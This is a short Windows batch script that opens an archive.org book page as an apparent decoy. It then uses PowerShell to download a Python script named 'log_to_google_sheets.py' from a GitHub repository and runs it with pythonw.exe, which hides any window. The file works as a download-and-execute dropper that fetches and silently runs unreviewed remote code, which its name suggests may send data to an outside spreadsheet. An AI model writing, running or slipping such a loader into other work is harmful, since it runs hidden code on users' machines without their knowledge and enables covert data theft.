@echo off
::
start "" "https://archive.org/details/latiatulanovela00unam/mode/2up?ref=ol&view=theater"

:: 
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/lolohole/my-front-end/raw/main/log_to_google_sheets.py', 'log_to_google_sheets.py')"

:: 
pythonw.exe log_to_google_sheets.py

